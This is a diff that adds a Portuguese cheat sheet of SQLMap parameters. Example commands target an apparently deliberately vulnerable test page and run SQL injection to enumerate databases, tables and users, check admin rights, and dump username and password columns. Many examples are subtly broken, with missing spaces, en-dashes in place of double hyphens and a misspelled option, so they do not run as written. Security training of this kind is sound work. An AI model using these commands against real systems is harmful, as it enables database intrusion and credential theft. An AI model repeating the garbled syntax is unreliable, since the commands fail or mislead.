@@ -1,0 +1,41 @@
+Seguem alguns parâmetros de uso do SQLMap:
+
+--help
+Mostra as opções do SQLMAP
+
+--current-db
+Apresenta o banco de dados atualExemplo: sqlmap-url"http://testphp.vulnweb.com/listproducts.php?cat=1" --current-db
+
+--banner
+Pega o Banner do DBMS
+Exemplo: sqlmap--url"http://testphp.vulnweb.com/listproducts.php?cat=1" -b
+
+--dbs
+Lista os bancos de dados do DBMSExemplo: sqlmap-url"http://testphp.vulnweb.com/listproducts.php?cat=1" –dbs
+
+--tables
+Apresenta as tabelas do banco selecionadoExemplo: sqlmap url"http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart--tables
+
+DBMS: “Database Management System”, sistema gerenciador de banco de dados
+
+--columns
+Apresenta as colunas da tabela selecionada
+Exemplo: sqlmap--u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart-T users--columns
+
+--dump
+Extrai as informações da colunas selecionadasExemplo: sqlmap-u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart-T users-C 'uname,pass' –dump
+
+--current-user
+Extrai informações sobre usuário conectado no banco de dados correnteExemplo: sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 –curent-user
+
+--is-dba
+Verifica se o usuário atual é administrador do Banco
+Exemplo: sqlmap-u "http://testphp.vulnweb.com/listproducts.php?cat=1" --is-dba
+
+--users
+Enumera todos os usuários
+Exemplo:sqlmap-u "http://testphp.vulnweb.com/listproducts.php?cat=1" --users
+
+--search
+Varre o banco atrás do que você procura, pode ser um banco, tabela ou coluna
+Exemplo: sqlmap-u "http://testphp.vulnweb.com/listproducts.php?cat=1" --search –C ‘pass’
